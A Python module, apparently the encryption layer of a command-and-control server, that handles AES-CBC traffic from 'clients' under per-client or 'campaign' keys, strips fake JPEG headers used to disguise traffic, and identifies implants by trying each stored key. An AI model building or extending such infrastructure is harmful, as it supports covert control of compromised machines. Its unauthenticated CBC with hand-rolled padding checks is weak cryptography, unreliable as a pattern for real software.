import os
import base64
import json
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

logger = logging.getLogger(__name__)

class CryptoHelper:
    """Handles encryption and decryption operations for client communication"""
    
    def __init__(self, crypto_manager, client_manager):
        self.crypto_manager = crypto_manager
        self.client_manager = client_manager
    
    def get_client_key(self, client_id):
        """Get the appropriate encryption key for a client"""
        # Use client-specific key if available, otherwise use campaign key
        if hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            return self.client_manager.client_keys[client_id]
        # Fall back to campaign-wide key
        return self.crypto_manager.key

    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys

    def encrypt(self, data, client_id=None):
        """Encrypt data using client key if available, otherwise campaign key"""
        key = self.get_client_key(client_id) if client_id else self.crypto_manager.key
        
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate a random IV
        iv = os.urandom(16)
        
        # Add padding manually (simple PKCS7-like padding)
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length]) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and ciphertext and base64 encode
        return base64.b64encode(iv + ciphertext).decode('utf-8')
    
    def decrypt(self, encrypted_data, client_id=None):
        """Decrypt data using client key if available, otherwise campaign key"""
        try:
            # Try with client-specific key if client_id is provided
            if client_id:
                key = self.get_client_key(client_id)
                return self._decrypt_with_key(encrypted_data, key)
        except Exception as e:
            # If client key failed, fall back to campaign key
            logger.debug(f"Client key decryption failed, trying campaign key: {e}")
        
        # If no client_id provided or client key decryption failed, try campaign key
        try:
            return self._decrypt_with_key(encrypted_data, self.crypto_manager.key)
        except Exception as e:
            # Propagate error if both keys fail
            logger.error(f"Decryption failed with both client and campaign keys: {e}")
            raise
    
    def _decrypt_with_key(self, encrypted_data, key):
        """Decrypt data using a specific key"""
        # Handle JPEG header if present (skip first 3 bytes if they're JPEG header)
        try:
            decoded_data = base64.b64decode(encrypted_data)
            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
                # Remove JPEG header and re-encode to base64
                stripped_data = base64.b64encode(decoded_data[3:]).decode('utf-8')
                logger.debug("Removed JPEG header from encrypted data")
                encrypted_data = stripped_data
        except Exception as e:
            logger.debug(f"No JPEG header detected or error processing: {e}")
        
        # Decode the base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # Extract the IV and ciphertext
        iv = encrypted_bytes[:16]
        ciphertext = encrypted_bytes[16:]
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove padding manually
        padding_length = padded_data[-1]
        if padding_length > 0 and padding_length <= 16:  # Validate the padding
            data = padded_data[:-padding_length]
            return data.decode('utf-8')
        else:
            # Invalid padding, likely wrong key
            raise ValueError("Invalid padding in decrypted data")
    
    def identify_client_by_decryption(self, encrypted_data):
        """
        Identify client by trying each client key for decryption
        
        Args:
            encrypted_data: Encrypted data to attempt decryption on
            
        Returns:
            tuple: (client_id, decrypted_data) or (None, None) if no key works
        """
        # Handle JPEG header if present (skip first 3 bytes if they're JPEG header)
        try:
            decoded_data = base64.b64decode(encrypted_data)
            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
                # Remove JPEG header and re-encode to base64
                stripped_data = base64.b64encode(decoded_data[3:]).decode('utf-8')
                logger.debug("Removed JPEG header from encrypted data")
                encrypted_data = stripped_data
        except Exception as e:
            logger.debug(f"No JPEG header detected or error processing: {e}")
        
        # For first contact, the data may be unencrypted or minimally encrypted
        # Check if it's a simple JSON string - first contact sends {}, a simple empty JSON object
        try:
            simple_json = json.loads(encrypted_data)
            # If we can load this as JSON, it's likely a first contact with empty data
            # Return None for client ID but the parsed JSON as data
            if isinstance(simple_json, dict) and not simple_json:  # Empty dict {}
                logger.info("Identified first contact with empty JSON data")
                return None, encrypted_data
        except json.JSONDecodeError:
            # Not simple JSON, continue with decryption attempts
            pass
        
        # Try all client-specific keys first
        if hasattr(self.client_manager, 'client_keys'):
            for client_id, key in self.client_manager.client_keys.items():
                try:
                    # Attempt decryption with this client's key
                    decrypted_data = self._decrypt_with_key(encrypted_data, key)
                    
                    # Verify the result is valid JSON
                    try:
                        json.loads(decrypted_data)
                        # If we got here, decryption was successful and produced valid JSON
                        logger.info(f"Successfully identified client {client_id} through key-based decryption")
                        return client_id, decrypted_data
                    except json.JSONDecodeError:
                        # Not valid JSON, try next key
                        continue
                except Exception as e:
                    # Decryption failed, try next key
                    logger.debug(f"Decryption failed with key for client {client_id}: {e}")
                    continue
        
        # If no client key worked, try the campaign key as fallback
        try:
            decrypted_data = self._decrypt_with_key(encrypted_data, self.crypto_manager.key)
            # Try to parse as JSON to verify it's valid
            try:
                json.loads(decrypted_data)
                logger.info("Message decrypted with campaign key - likely from a new client")
                return None, decrypted_data  # No client ID, but decryption succeeded
            except json.JSONDecodeError:
                # Not valid JSON even though decryption succeeded
                logger.warning("Decryption succeeded but result is not valid JSON")
                # Return a best effort - might be binary data or something else
                return None, decrypted_data
        except Exception as e:
            logger.debug(f"Campaign key decryption attempt failed: {e}")
        
        # If we got here, no key worked
        logger.warning("Failed to identify client - no key could decrypt the data")
        return None, None